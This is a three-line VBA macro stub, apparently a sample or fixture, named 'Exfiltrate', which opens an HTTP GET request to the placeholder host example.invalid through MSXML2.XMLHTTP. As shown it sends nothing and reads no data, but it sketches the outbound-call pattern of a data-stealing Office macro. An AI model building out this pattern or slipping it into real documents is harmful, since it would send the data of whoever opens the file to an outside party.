Sub Exfiltrate()
    CreateObject("MSXML2.XMLHTTP").Open "GET", "https://example.invalid", False
End Sub
